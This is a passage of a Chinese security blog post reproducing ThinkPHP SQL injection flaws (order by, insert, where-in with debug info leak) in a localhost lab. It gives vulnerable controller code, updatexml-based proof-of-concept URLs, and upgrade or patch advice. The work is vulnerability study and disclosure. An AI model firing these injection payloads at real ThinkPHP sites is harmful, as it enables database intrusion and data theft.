+<p><img src="/2020/01/19/thinkphp/thinkphp-sqli-vuln-orderby-03.png" alt="thinkphp-sqli-vuln-orderby-03"></p>
+<p>3.复现</p>
+<p>poc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">order[id`|updatexml(1,concat(0x3a,user()),1)%23]=1</div></pre></td></tr></table></figure></p>
+<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/tp5_1_22/public/index.php/index/index/orderbytest?order[id`|updatexml(1,concat(0x3a,user()),1)%23]=1</div></pre></td></tr></table></figure></p>
+<p>结果：<br><img src="/2020/01/19/thinkphp/thinkphp-sqli-vuln-orderby-04.png" alt="thinkphp-sqli-vuln-orderby-04"></p>
+<h5 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>//TODO</p>
+<h5 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h5><p>5.x版本升级到最新版本<br>3.x版本升级到最新版本</p>
+<h5 id="参考资料-1"><a href="#参考资料-1" class="headerlink" title="参考资料"></a>参考资料</h5><p><a href="https://mp.weixin.qq.com/s/jDvOif0OByWkUNLv0CAs7w" target="_blank" rel="external">https://mp.weixin.qq.com/s/jDvOif0OByWkUNLv0CAs7w</a></p>
+<h4 id="ThinkPHP-5-0-x-insert-注入漏洞"><a href="#ThinkPHP-5-0-x-insert-注入漏洞" class="headerlink" title="ThinkPHP 5.0.x insert 注入漏洞"></a>ThinkPHP 5.0.x insert 注入漏洞</h4><h5 id="影响范围-3"><a href="#影响范围-3" class="headerlink" title="影响范围"></a>影响范围</h5><p>&lt; 5.0.16</p>
+<h5 id="环境搭建-3"><a href="#环境搭建-3" class="headerlink" title="环境搭建"></a>环境搭建</h5><p>搭建thinkphp 5.0.15<br><img src="/2020/01/19/thinkphp/thinkphp-sqli-vuln-insert-01.png" alt="thinkphp-sqli-vuln-insert-01"></p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-sqli-vuln-insert-02.png" alt="thinkphp-sqli-vuln-insert-02"></p>
+<h5 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>1.首先开启thinkphp debug模式，在<code>application/config.php</code>中，设置app_debug为true.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;app_debug&apos;              =&gt; true,</div></pre></td></tr></table></figure></p>
+<p>并配置好database.php的数据库连接信息<br><img src="/2020/01/19/thinkphp/thinkphp-sqli-vuln-orderby-05.png" alt="thinkphp-sqli-vuln-orderby-05"></p>
+<p>2.在thinkphp提供的默认控制器index下增加一些代码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">testsql</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    $username = input(<span class="string">'get.username/a'</span>);</div><div class="line">    db(<span class="string">'test'</span>)-&gt;insert([<span class="string">'username'</span>=&gt;$username]);</div><div class="line">	<span class="comment">//test是数据库名字</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-sqli-vuln-insert-03.png" alt="thinkphp-sqli-vuln-insert-03"></p>
+<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/tp5_0_15/public/index.php/index/index/testsql?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7e,user(),0x7e),1)&amp;username[2]=1</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-sqli-vuln-insert-04.png" alt="thinkphp-sqli-vuln-insert-04"></p>
+<h5 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><h5 id="修复建议-3"><a href="#修复建议-3" class="headerlink" title="修复建议"></a>修复建议</h5><p>1.根据官方提交的修复代码进行修复，<br><a href="https://github.com/top-think/framework/commit/363fd4d90312f2cfa427535b7ea01a097ca8db1b" target="_blank" rel="external">官方commit</a></p>
+<p>或者 </p>
+<p>2.升级thinkphp版本。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">composer require &quot;topthink/framework=5.0.24&quot;</div></pre></td></tr></table></figure></p>
+<h5 id="参考资料-2"><a href="#参考资料-2" class="headerlink" title="参考资料"></a>参考资料</h5><p><a href="https://xz.aliyun.com/t/2257" target="_blank" rel="external">https://xz.aliyun.com/t/2257</a></p>
+<h4 id="ThinkPHP-5-0-x-注入-amp-amp-敏感信息泄露"><a href="#ThinkPHP-5-0-x-注入-amp-amp-敏感信息泄露" class="headerlink" title="ThinkPHP 5.0.x 注入 &amp;&amp; 敏感信息泄露"></a>ThinkPHP 5.0.x 注入 &amp;&amp; 敏感信息泄露</h4><h5 id="影响范围-4"><a href="#影响范围-4" class="headerlink" title="影响范围"></a>影响范围</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">5&lt;ThinkPHP&lt;=5.0.9</div></pre></td></tr></table></figure>
+<h5 id="环境搭建-4"><a href="#环境搭建-4" class="headerlink" title="环境搭建"></a>环境搭建</h5><p>1.安装thinkphp5.0.9<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">composer create-project topthink/think=5.0.9 tp5_0_9</div></pre></td></tr></table></figure></p>
+<p>2.进入tp5_0_9目录，将目录下的composer.json文件中的topthink/framework版本更改为5.0.9.<br><code>&quot;topthink/framework&quot;: &quot;5.0.9&quot;</code><br><img src="/2020/01/19/thinkphp/thinkphp-sqli-vuln-and-info-xielou-01.png" alt="thinkphp-sqli-vuln-and-info-xielou-01"></p>
+<p>3.执行更新<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">composer update</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-sqli-vuln-and-info-xielou-02.png" alt="thinkphp-sqli-vuln-and-info-xielou-02"></p>
+<h5 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>1.配置 application/database.php文件。<br><img src="/2020/01/19/thinkphp/thinkphp-sqli-vuln-orderby-05.png" alt="thinkphp-sqli-vuln-orderby-05"></p>
+<p>2.在thinkphp提供的默认控制器index下增加一些代码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    $ids = input(<span class="string">'ids/a'</span>);</div><div class="line">    $result = db(<span class="string">'test'</span>)-&gt;where(<span class="string">'id'</span>, <span class="string">'in'</span>, $ids)-&gt;select();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-sqli-vuln-and-info-xielou-03.png" alt="thinkphp-sqli-vuln-and-info-xielou-03"></p>
+<p>3.执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/tp5_0_9/public/index.php/index/index/test?ids[0,updatexml(0,concat(0xa,user()),0)]=1</div></pre></td></tr></table></figure></p>
+<p>结果：<br><img src="/2020/01/19/thinkphp/thinkphp-sqli-vuln-and-info-xielou-04.png" alt="thinkphp-sqli-vuln-and-info-xielou-04"></p>
+<h5 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><h5 id="修复建议-4"><a href="#修复建议-4" class="headerlink" title="修复建议"></a>修复建议</h5><p>1.升级thinkphp至最新版本。</p>
+<p>or</p>
+<p>2.设置 thinkphp debug=false.<br><img src="/2020/01/19/thinkphp/thinkphp-sqli-vuln-and-info-xielou-05.png" alt="thinkphp-sqli-vuln-and-info-xielou-05"></p>
+<h5 id="参考资料-3"><a href="#参考资料-3" class="headerlink" title="参考资料"></a>参考资料</h5><p><a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html</a><br><a href="https://xz.aliyun.com/t/125" target="_blank" rel="external">https://xz.aliyun.com/t/125</a></p>
+<h4 id="moban"><a href="#moban" class="headerlink" title="moban"></a>moban</h4><h5 id="影响范围-5"><a href="#影响范围-5" class="headerlink" title="影响范围"></a>影响范围</h5><h5 id="环境搭建-5"><a href="#环境搭建-5" class="headerlink" title="环境搭建"></a>环境搭建</h5><h5 id="漏洞复现-5"><a href="#漏洞复现-5" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><h5 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><h5 id="修复建议-5"><a href="#修复建议-5" class="headerlink" title="修复建议"></a>修复建议</h5><h5 id="参考资料-4"><a href="#参考资料-4" class="headerlink" title="参考资料"></a>参考资料</h5><h3 id="thinkphp自带函数"><a href="#thinkphp自带函数" class="headerlink" title="thinkphp自带函数"></a>thinkphp自带函数</h3><h3 id="php调试"><a href="#php调试" class="headerlink" title="php调试"></a>php调试</h3><p><a href="https://blog.csdn.net/nzjdsds/article/details/100114242" target="_blank" rel="external">https://blog.csdn.net/nzjdsds/article/details/100114242</a><br><a href="https://www.cnblogs.com/lonelyxmas/p/7812157.html" target="_blank" rel="external">https://www.cnblogs.com/lonelyxmas/p/7812157.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>穷困潦倒的安全工作者，如果文章对您有所帮助，可以选择性打赏。</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/WeChatQR.JPG" alt="lyxhh 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    lyxhh
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://www.lxhsec.com/2020/01/19/thinkphp/" title="thinkphp">http://www.lxhsec.com/2020/01/19/thinkphp/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/01/06/php/" rel="next" title="php">
+                <i class="fa fa-chevron-left"></i> php
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/02/01/php-code-audit/" rel="prev" title="php-ZhiCms">
+                php-ZhiCms <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zMjIyNy84Nzkx"></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/1.jpg"
+                alt="lyxhh" />
+            
+              <p class="site-author-name" itemprop="name">lyxhh</p>
+              <p class="site-description motion-element" itemprop="description">有你给的阳光，没有理由绝望。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.secbug.org/" title="破晓团队" target="_blank">破晓团队</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#thinkphp"><span class="nav-number">1.</span> <span class="nav-text">thinkphp</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#简介"><span class="nav-number">1.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#入门"><span class="nav-number">1.2.</span> <span class="nav-text">入门</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#composer"><span class="nav-number">1.2.1.</span> <span class="nav-text">composer</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#安装"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">安装</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#切换源"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">切换源</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#thinkphp安装"><span class="nav-number">1.2.2.</span> <span class="nav-text">thinkphp安装</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#开发规范"><span class="nav-number">1.2.3.</span> <span class="nav-text">开发规范</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#目录和文件"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">目录和文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#函数和类、属性命名"><span class="nav-number">1.2.3.2.</span> <span class="nav-text">函数和类、属性命名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#常量和配置"><span class="nav-number">1.2.3.3.</span> <span class="nav-text">常量和配置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数据表和字段"><span class="nav-number">1.2.3.4.</span> <span class="nav-text">数据表和字段</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#路由定义"><span class="nav-number">1.2.4.</span> <span class="nav-text">路由定义</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#pathinfo模式"><span class="nav-number">1.2.4.1.</span> <span class="nav-text">pathinfo模式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#自定义路由"><span class="nav-number">1.2.4.2.</span> <span class="nav-text">自定义路由</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#路由请求参数"><span class="nav-number">1.2.5.</span> <span class="nav-text">路由请求参数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#局部变量规则"><span class="nav-number">1.2.5.1.</span> <span class="nav-text">局部变量规则</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#全局变量规则"><span class="nav-number">1.2.5.2.</span> <span class="nav-text">全局变量规则</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#可选变量"><span class="nav-number">1.2.5.3.</span> <span class="nav-text">可选变量</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#路由完全匹配"><span class="nav-number">1.2.5.4.</span> <span class="nav-text">路由完全匹配</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#路由分组"><span class="nav-number">1.2.6.</span> <span class="nav-text">路由分组</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#页面跳转"><span class="nav-number">1.2.7.</span> <span class="nav-text">页面跳转</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP请求参数"><span class="nav-number">1.2.8.</span> <span class="nav-text">HTTP请求参数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Facade方式获取请求参数"><span class="nav-number">1.2.8.1.</span> <span class="nav-text">Facade方式获取请求参数</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#检测变量是否设置"><span class="nav-number">1.2.8.1.1.</span> <span class="nav-text">检测变量是否设置</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#变量获取"><span class="nav-number">1.2.8.1.2.</span> <span class="nav-text">变量获取</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#获取部分变量"><span class="nav-number">1.2.8.1.3.</span> <span class="nav-text">获取部分变量</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#变量修饰符"><span class="nav-number">1.2.8.1.4.</span> <span class="nav-text">变量修饰符</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#助手函数"><span class="nav-number">1.2.8.1.5.</span> <span class="nav-text">助手函数</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#依赖注入"><span class="nav-number">1.2.8.2.</span> <span class="nav-text">依赖注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#操作方法注入"><span class="nav-number">1.2.8.2.1.</span> <span class="nav-text">操作方法注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#构造方法注入"><span class="nav-number">1.2.8.2.2.</span> <span class="nav-text">构造方法注入</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#不继承系统的控制器基类"><span class="nav-number">1.2.8.2.2.1.</span> <span class="nav-text">不继承系统的控制器基类</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#继承系统的控制器基类"><span class="nav-number">1.2.8.2.2.2.</span> <span class="nav-text">继承系统的控制器基类</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#助手函数-1"><span class="nav-number">1.2.8.3.</span> <span class="nav-text">助手函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP请求响应"><span class="nav-number">1.2.9.</span> <span class="nav-text">HTTP请求响应</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#响应参数"><span class="nav-number">1.2.9.1.</span> <span class="nav-text">响应参数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#重定向"><span class="nav-number">1.2.9.2.</span> <span class="nav-text">重定向</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#模板"><span class="nav-number">1.2.10.</span> <span class="nav-text">模板</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#模板定义"><span class="nav-number">1.2.10.1.</span> <span class="nav-text">模板定义</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#模板渲染"><span class="nav-number">1.2.10.2.</span> <span class="nav-text">模板渲染</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#模板赋值"><span class="nav-number">1.2.10.3.</span> <span class="nav-text">模板赋值</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#assign方法"><span class="nav-number">1.2.10.3.1.</span> <span class="nav-text">assign方法</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#方法传入参数"><span class="nav-number">1.2.10.3.2.</span> <span class="nav-text">方法传入参数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#助手函数-2"><span class="nav-number">1.2.10.3.3.</span> <span class="nav-text">助手函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#compact方式"><span class="nav-number">1.2.10.3.4.</span> <span class="nav-text">compact方式</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#助手函数-3"><span class="nav-number">1.2.10.4.</span> <span class="nav-text">助手函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#渲染内容"><span class="nav-number">1.2.10.5.</span> <span class="nav-text">渲染内容</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用函数"><span class="nav-number">1.2.10.6.</span> <span class="nav-text">使用函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#原样输出"><span class="nav-number">1.2.10.7.</span> <span class="nav-text">原样输出</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#数据库"><span class="nav-number">1.2.11.</span> <span class="nav-text">数据库</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#原生sql"><span class="nav-number">1.2.11.1.</span> <span class="nav-text">原生sql</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CURD"><span class="nav-number">1.2.11.2.</span> <span class="nav-text">CURD</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#增"><span class="nav-number">1.2.11.2.1.</span> <span class="nav-text">增</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#模型"><span class="nav-number">1.2.12.</span> <span class="nav-text">模型</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#模型定义"><span class="nav-number">1.2.12.1.</span> <span class="nav-text">模型定义</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#模型CURD"><span class="nav-number">1.2.12.2.</span> <span class="nav-text">模型CURD</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#thinkphp安全"><span class="nav-number">1.3.</span> <span class="nav-text">thinkphp安全</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#thinkphp-框架漏洞"><span class="nav-number">1.3.1.</span> <span class="nav-text">thinkphp 框架漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ThinkPHP-5-x-远程代码执行漏洞"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">ThinkPHP 5.x 远程代码执行漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#影响范围"><span class="nav-number">1.3.1.1.1.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#环境搭建"><span class="nav-number">1.3.1.1.2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞复现"><span class="nav-number">1.3.1.1.3.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞分析"><span class="nav-number">1.3.1.1.4.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#修复建议"><span class="nav-number">1.3.1.1.5.</span> <span class="nav-text">修复建议</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ThinkPHP-5-0-x-远程代码执行漏洞"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">ThinkPHP 5.0.x 远程代码执行漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#影响范围-1"><span class="nav-number">1.3.1.2.1.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#环境搭建-1"><span class="nav-number">1.3.1.2.2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞复现-1"><span class="nav-number">1.3.1.2.3.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞分析-1"><span class="nav-number">1.3.1.2.4.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#修复建议-1"><span class="nav-number">1.3.1.2.5.</span> <span class="nav-text">修复建议</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#参考资料"><span class="nav-number">1.3.1.2.5.1.</span> <span class="nav-text">参考资料</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ThinkPHP-3-x-5-x-order-by-注入漏洞"><span class="nav-number">1.3.1.3.</span> <span class="nav-text">ThinkPHP 3.x/5.x order by 注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#影响范围-2"><span class="nav-number">1.3.1.3.1.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#环境搭建-2"><span class="nav-number">1.3.1.3.2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞复现-2"><span class="nav-number">1.3.1.3.3.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞分析-2"><span class="nav-number">1.3.1.3.4.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#修复建议-2"><span class="nav-number">1.3.1.3.5.</span> <span class="nav-text">修复建议</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#参考资料-1"><span class="nav-number">1.3.1.3.6.</span> <span class="nav-text">参考资料</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ThinkPHP-5-0-x-insert-注入漏洞"><span class="nav-number">1.3.1.4.</span> <span class="nav-text">ThinkPHP 5.0.x insert 注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#影响范围-3"><span class="nav-number">1.3.1.4.1.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#环境搭建-3"><span class="nav-number">1.3.1.4.2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞复现-3"><span class="nav-number">1.3.1.4.3.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞分析-3"><span class="nav-number">1.3.1.4.4.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#修复建议-3"><span class="nav-number">1.3.1.4.5.</span> <span class="nav-text">修复建议</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#参考资料-2"><span class="nav-number">1.3.1.4.6.</span> <span class="nav-text">参考资料</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ThinkPHP-5-0-x-注入-amp-amp-敏感信息泄露"><span class="nav-number">1.3.1.5.</span> <span class="nav-text">ThinkPHP 5.0.x 注入 && 敏感信息泄露</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#影响范围-4"><span class="nav-number">1.3.1.5.1.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#环境搭建-4"><span class="nav-number">1.3.1.5.2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞复现-4"><span class="nav-number">1.3.1.5.3.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞分析-4"><span class="nav-number">1.3.1.5.4.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#修复建议-4"><span class="nav-number">1.3.1.5.5.</span> <span class="nav-text">修复建议</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#参考资料-3"><span class="nav-number">1.3.1.5.6.</span> <span class="nav-text">参考资料</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#moban"><span class="nav-number">1.3.1.6.</span> <span class="nav-text">moban</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#影响范围-5"><span class="nav-number">1.3.1.6.1.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#环境搭建-5"><span class="nav-number">1.3.1.6.2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞复现-5"><span class="nav-number">1.3.1.6.3.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞分析-5"><span class="nav-number">1.3.1.6.4.</span> 